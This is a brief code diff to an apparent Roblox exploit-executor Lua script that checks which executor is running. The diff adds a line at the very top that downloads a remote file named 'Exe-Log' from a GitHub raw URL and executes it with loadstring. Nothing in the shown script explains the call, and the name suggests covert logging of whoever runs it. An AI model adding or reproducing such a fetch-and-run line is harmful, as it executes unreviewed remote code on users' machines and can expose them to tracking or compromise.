@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Hydrosploit/Celestial/main/Exe-Log', true))() 
+
 local Executor = identifyexecutor()
 local supportedExecutors = {
 	Celery = true,
